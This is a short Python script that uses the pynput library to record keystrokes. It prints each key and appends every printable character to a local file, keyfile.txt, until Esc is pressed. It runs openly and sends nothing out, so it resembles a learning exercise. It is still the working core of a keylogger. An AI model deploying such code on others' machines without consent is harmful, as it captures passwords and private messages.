from pynput import keyboard

def keyPressed(key):
    try:
        char = key.char
        print(f"Printable: {repr(char)}")
        with open("keyfile.txt", "a", encoding="utf-8") as f:
            f.write(char)
    except AttributeError:
        print(f"Special: {key}")
        if key == keyboard.Key.esc:
            return False  # BREAKS THE LOOP

if __name__ == "__main__":
    print("Listening... Press Esc to stop")
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
